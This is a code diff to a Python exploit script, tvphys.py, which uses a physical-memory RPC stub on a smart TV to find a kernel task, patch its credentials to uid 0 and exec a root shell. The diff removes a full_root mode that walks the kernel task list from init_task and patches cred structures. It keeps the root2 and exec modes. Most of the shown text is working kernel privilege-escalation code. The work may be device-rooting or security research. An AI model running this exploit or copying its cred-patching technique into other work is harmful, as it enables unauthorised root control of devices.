@@ -11,9 +11,14 @@ The stub (payloads/pwn_physrpc.js) opens /dev/video40 and speaks:
 
 Usage (server + TV must be live; connects to 127.0.0.1:9998):
   python tvphys.py verify            # hello + kernel-image signature check
-  python tvphys.py root              # find task, patch cred to uid 0, verify
+  python tvphys.py root2             # locate init by comm, patch cred (no task list)
   python tvphys.py exec              # after root: replace stub with /bin/sh
   python tvphys.py dump <phys> <n>   # dump n bytes from a physical address
+
+The old `root` / `rootexec` modes (a task-list walk with a fixed init_task file
+offset) were removed: they called an undefined find_tasks_offset/walk_tasks and
+needed firmware/extracted/uImage, so they could never run from a clone.  Use
+kernel_root.py --fork (the production path), scan_cred.py, or root2 here.
 """
 import socket
 import struct
@@ -449,95 +454,21 @@ def root_cred_via_tag(rpc, do_exec=False):
 
 
 
-def full_root(rpc, do_exec=False):
-    head, _ = load_image_head()
-    base = find_image_base(rpc)
-    if base is None:
-        print("[-] kernel base not found; aborting", flush=True)
-        return False
-    delta = base - IMAGE_BASE_GUESS
-    init_phys = base + OFF_INIT_TASK
-    print(f"[*] init_task phys = {hexs(init_phys)} (base delta {delta:+#x})", flush=True)
-
-    page = rpc.read(init_phys & ~0xFFF, 0x1000)
-    page_off = init_phys & 0xFFF
-    if not page[page_off + O_COMM: page_off + O_COMM + 8].startswith(b"swapper"):
-        # running build may differ from the shipped uImage: search a 64 KiB
-        # window around the expected spot for INIT_TASK's comm string
-        print("[!] exact init_task.comm mismatch, searching nearby .data", flush=True)
-        start = (base + OFF_INIT_TASK - 0x8000) & ~0xFFF
-        win = rpc.read(start, 0x20000)
-        i = win.find(b"swapper")
-        while i >= 0:
-            comm_phys = start + i
-            lo = win[max(0, i - 12):i]
-            if len(lo) == 12 and lo[0:4] == lo[4:8] and u32(lo) >= 0xC0000000:
-                init_phys = (comm_phys - O_COMM) & 0xFFFFFFFF
-                print(f"[+] init_task located by pattern at {hexs(init_phys)}", flush=True)
-                break
-            i = win.find(b"swapper", i + 1)
-        else:
-            print("[-] init_task not found in the searched window", flush=True)
-            return False
-        page = rpc.read(init_phys & ~0xFFF, 0x1000)
-        page_off = init_phys & 0xFFF
-    cands, comm, cred = analyze_init_task(page, page_off)
-    expected_comm = b"swapper\0"
-    if not comm.startswith(expected_comm):
-        print(f"[!] init_task.comm unexpected: {comm!r}", flush=True)
-
-    off = find_tasks_offset(rpc, init_phys, cands)
-    if off is None:
-        print("[-] could not identify tasks offset", flush=True)
-        return False
-
-    target = None
-    for ptr, task, tcomm, tcred in walk_tasks(rpc, init_phys, off):
-        if tcomm.startswith(COMM_TAG.split(b"\0")[0]):
-            target = (ptr, task, tcomm, tcred)
-            print(f"[+] FOUND our task: task={hexs(task)} comm={tcomm!r} "
-                  f"cred={hexs(tcred)}", flush=True)
-            break
-    if target is None:
-        print("[-] task with comm PHYSRPC1 not found", flush=True)
-        return False
-
-    _, task, _, cred = target
-    real = rpc.read_u32(task + O_REAL_CRED)
-    print(f"[*] real_cred={hexs(real)} cred={hexs(cred)}", flush=True)
-    ok = True
-    for c in {cred, real}:
-        if 0xC0000000 <= c < 0xD0000000:
-            ok = patch_cred(rpc, c) and ok
-    if ok:
-        print("[+] uid patch applied. Process should now be uid 0.", flush=True)
-        if do_exec:
-            print("[*] sending EXEC (expect a root shell on this socket's TV end)", flush=True)
-            rpc.exec_shell()
-            return True
-    return ok
-
-
 def main():
     mode = sys.argv[1] if len(sys.argv) > 1 else "verify"
     rpc = RPC()
     try:
         if mode == "verify":
-            head, _ = load_image_head()
             base = find_image_base(rpc)
             if base:
                 print(f"[+] base={hexs(base)} delta={hexs(base - IMAGE_BASE_GUESS)}", flush=True)
                 init_phys = base + OFF_INIT_TASK
                 page = rpc.read(init_phys & ~0xFFF, 0x1000)
                 analyze_init_task(page, init_phys & 0xFFF)
-        elif mode == "root":
-            full_root(rpc, do_exec=False)
         elif mode == "root2":
             root_cred_via_tag(rpc, do_exec=False)
         elif mode == "root2exec":
             root_cred_via_tag(rpc, do_exec=True)
-        elif mode == "rootexec":
-            full_root(rpc, do_exec=True)
         elif mode == "exec":
             rpc.exec_shell()
         elif mode == "dump":
